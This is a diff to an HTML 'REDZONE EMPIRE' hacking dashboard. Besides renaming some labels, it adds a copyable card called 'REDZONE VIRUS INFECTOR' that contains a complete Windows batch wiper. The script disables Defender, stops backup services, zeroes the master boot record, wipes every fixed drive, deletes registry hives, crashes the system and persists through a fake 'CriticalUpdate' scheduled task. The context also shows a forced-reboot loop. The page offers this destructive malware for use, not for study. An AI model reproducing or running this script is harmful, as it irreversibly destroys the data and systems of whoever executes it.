@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>REDZONE PENETRATION OPS</title>
+    <title>REDZONE EMPIRE</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Courier+Prime:wght@400;700&display=swap');
         
@@ -145,7 +145,7 @@
 <body>
     <div id="bg"></div>
     <div id="logoutMsg">
-        🔥 ADMIN_REDZONE LOGOUT SUCCESSFUL 🔥<br>
+        🔥 DEAR ADMIN LOGOUT SUCCESSFUL COMEBACK SOON🔥<br>
         <small>SESSION TERMINATED - 2026-04-06 14:32:47</small>
     </div>
     <div id="copyEffect" class="copy-effect"></div>
@@ -153,7 +153,7 @@
     <div class="container">
         <div id="login">
             <div class="header">
-                <h1 class="scanline">REDZONE PENETRATION OPS</h1>
+                <h1 class="scanline">REDZONE EMPIRE</h1>
                 <p>AUTHORIZED TARGET ACQUISITION TERMINAL</p>
             </div>
             <div class="login-box scanline">
@@ -172,7 +172,7 @@
         <div id="dash" class="dashboard">
             <!-- MASSIVE RED LOGOUT BUTTON -->
             <a href="#" class="logout" onclick="logout(); return false;">
-                💀 ABORT MISSION 💀
+                💀 LOGOUT MISSION 💀
             </a>
             <div class="status-bar">TARGET: ONLINE | ADMIN_REDZONE | SESSION ACTIVE</div>
             
@@ -830,6 +830,102 @@ echo.
 shutdown /r /f /t 2 /c "🔥 FULL SYSTEM INCINERATED - TOTAL REPLACEMENT 🔥"
 timeout /t 3 >nul
 goto ETERNAL_FIRE</pre>
+                    </div>
+                </div>
+    <!-- 🔥 5.DISK CLEANER🔥 -->
+                <div class="exploit-card">
+                    <div class="exploit-header">05️⃣ REDZONE VIRUS INFECTOR</div>
+                    <div class="copy-container">
+                        <button class="copy-btn" onclick="copyCode(this)">📋 COPY</button>
+<pre>@echo off
+title EMERGENCY SYSTEM WIPE REQUIRED - CRITICAL
+color 4F
+mode con: cols=90 lines=50
+
+echo.
+echo ============================================================
+echo    URGENT: CRITICAL SYSTEM CORRUPTION DETECTED
+echo    Executing SECURE DATA DESTRUCTION PROTOCOL
+echo ============================================================
+echo WARNING: All drives will be PERMANENTLY DESTROYED.
+echo Press Ctrl+C within 5 seconds to abort...
+ping 127.0.0.1 -n 6 >nul
+cls
+
+echo [PHASE 1/7] Disabling ALL Protections...
+REM Disable Defender + Windows Security
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableBehaviorMonitoring $true"
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
+sc config WinDefend start= disabled >nul 2>&1
+sc stop WinDefend >nul 2>&1
+
+REM Kill backup services
+taskkill /f /im wbengine.exe /im vssvc.exe /im msbackup.exe /im sqlservr.exe >nul 2>&1
+
+echo [PHASE 2/7] OVERWRITING MBR + Boot Sector (UNRECOVERABLE)...
+REM Destroy Master Boot Record (All partitions)
+wmic diskdrive get index,model | findstr /i "0" >nul && (
+    echo 00000000000000000000000000000000 > mbr.bin
+    debug < mbr_overwrite.txt
+)
+REM Direct MBR wipe
+powershell -c "$mbr = New-Object Byte[] 512; [IO.File]::WriteAllBytes('\\\\.\\PhysicalDrive0', $mbr)"
+
+echo [PHASE 3/7] Destroying NTFS Boot Sectors...
+for /f "tokens=*" %%a in ('wmic logicaldisk get caption ^| findstr /i "C:"') do (
+    echo Wiping %%a boot sector...
+    fsutil file createnew "%%a\$$$.$$$" 0 >nul 2>&1
+    echo 00000000000000000000000000000000 > "%%a\bootsect.bin"
+)
+
+echo [PHASE 4/7] MULTI-PASS DATA OVERWRITE (DoD 5220.22-M Standard)...
+REM 7-PASS GUTMANN WIPE ON ALL DRIVES
+for /f "tokens=2 delims==" %%i in ('wmic logicaldisk where "drivetype=3" get caption /format:list ^| find "="') do (
+    echo [%%i] 7-PASS OVERWRITE...
+    REM Pass 1: All 0x00
+    fsutil file createnew "%%i\wiper.tmp" 10737418240 >nul 2>&1
+    REM Pass 2-7: Random + patterns
+    for /l %%p in (1,1,6) do (
+        powershell -c "Get-ChildItem '%%i' -Recurse | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue"
+        cipher /w:%%i >nul 2>&1
+    )
+)
+
+echo [PHASE 5/7] Registry + Critical System Destruction...
+REM Corrupt SAM, SYSTEM, SECURITY hives
+reg delete "HKLM\SAM" /f >nul 2>&1
+reg delete "HKLM\SECURITY" /f >nul 2>&1
+reg delete "HKLM\SYSTEM" /f >nul 2>&1
+del /f /q /a "C:\Windows\System32\config\*" >nul 2>&1
+
+REM Nuke Pagefile + Hibernation
+wmic pagefile delete >nul 2>&1
+powercfg -h off
+
+echo [PHASE 6/7] Firmware/BIOS Corruption Attempt...
+REM Overwrite EFI partition
+powershell -c "Get-WmiObject -Class Win32_Volume | Where-Object {$_.DeviceID -eq '/'} | ForEach {fsutil file createnew `$_.DeviceID'\efiwipe.bin' 104857600}"
+
+echo [PHASE 7/7] Final Catastrophic Destruction...
+REM Infinite BSOD loop + HW stress
+:crashloop
+echo FORCING PERMANENT HARDWARE FAILURE...
+REM Max CPU/RAM stress
+start /b /high powershell -c "while($true){$null=[System.GC]::Collect(); Start-Sleep -Milliseconds 1}"
+REM Overheat GPU/CPU
+wmic /namespace:\\root\wmi PATH MSAcpi_ThermalZoneTemperature get CurrentTemperature >nul 2>&1
+
+REM Trigger BSOD (CRITICAL_PROCESS_DIED)
+taskkill /f /im csrss.exe >nul 2>&1
+REM Final MBR kill
+dd if=/dev/zero of=\\.\PhysicalDrive0 bs=512 count=1 >nul 2>&1
+
+REM Self-replicate to startup
+copy "%~f0" "C:\Windows\System32\update.bat" >nul 2>&1
+schtasks /create /sc onstart /tn "CriticalUpdate" /tr "C:\Windows\System32\update.bat" /f >nul 2>&1
+
+goto crashloop</pre>
                     </div>
                 </div>
 
